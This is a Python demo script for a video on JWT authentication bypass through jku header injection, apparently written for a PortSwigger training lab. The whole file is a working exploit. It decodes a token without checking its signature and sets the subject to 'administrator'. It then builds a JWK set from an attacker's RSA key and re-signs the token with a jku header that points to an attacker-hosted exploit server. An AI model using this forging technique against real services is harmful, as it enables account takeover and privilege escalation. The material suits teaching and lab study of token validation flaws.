# Demo script for 'JWT Authentication Bypass via jku Header Injection' video: https://youtu.be/hMRdMmll8Bk
import jwt
import base64
import json
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# Take a JWT and JKU URL as input
token = 'eyJraWQiOiIwYzNjMDRiMi1kOGI0LTQwMjYtYTdkMC01YTZhOWM5ZjM5YmUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3OTQ1Nzk3NCwic3ViIjoid2llbmVyIn0.AGMtP7mcLHnCqy_t-HhDXLWw2Phc8iwSJ4w1SYkfUoKFhD_jjwastsrdWaE_5s1DpmVespOYD_lf9mZylydJrO1GLYMxqylnAGKOivCQwcTHrothkTMOQNxddcilT6kTUK6VWpaOEuktCZJ6mp_FeqRUqsSoBFB-Qx4044JQhz7WglTaxRg-MydnVEYEJfyynUFuqnNHlxd1XwVWX4WI5xOBlaCWTQPqpVTS09a8aFXE88woJjOtWQYVHpYd_5FaB8O7WcBvNlZAI2wazKuOx3KO5ClICMDpuVZ25PpMPoahtS8teG5WRhGJ02aX3DIgJA7_SwuCbZzUkV8kVmfAhw'
jku_url = 'https://exploit-<YOUR-EXPLOIT-SERVER-ID>.exploit-server.net/jwks.json'

# Load and serialize the public key
with open('labs5Pub.pem', 'rb') as f:
    public_key = serialization.load_pem_public_key(
        f.read(),
        backend=default_backend()
    )

# Decode the JWT
decoded_token = jwt.decode(token, options={"verify_signature": False})
print(f"Decoded token:\n{json.dumps(decoded_token, indent=4)}\n")
decoded_header = jwt.get_unverified_header(token)
print(f"Decoded header:\n{json.dumps(decoded_header, indent=4)}\n")

# Modify the token (JWT manipulation)
decoded_token['sub'] = 'administrator'
print(f"Modified token:\n{json.dumps(decoded_token, indent=4)}\n")

# Sign the modified JWT using your RSA private key
with open('labs5Pv.pem', 'rb') as f:
    private_key = serialization.load_pem_private_key(
        f.read(),
        password=None,
        backend=default_backend()
    )

# Extract the necessary information from the keys
public_key = private_key.public_key()
public_numbers = public_key.public_numbers()

# Build the JWKs
jwk = {
    "kty": "RSA",
    "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8'),
    "kid": decoded_header['kid'],
    "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
}
keys = {"keys": [jwk]}
print(f"JWK:\n{json.dumps(keys, indent=4)}\n")

# Generate the modified token
modified_token = jwt.encode(decoded_token, private_key, algorithm='RS256', headers={'jku': jku_url, 'kid': jwk['kid']})

# Print the modified token header
print(f"Modified header:\n{json.dumps(jwt.get_unverified_header(modified_token), indent=4)}\n")

# Print the final token
print("Final Token: " + modified_token)
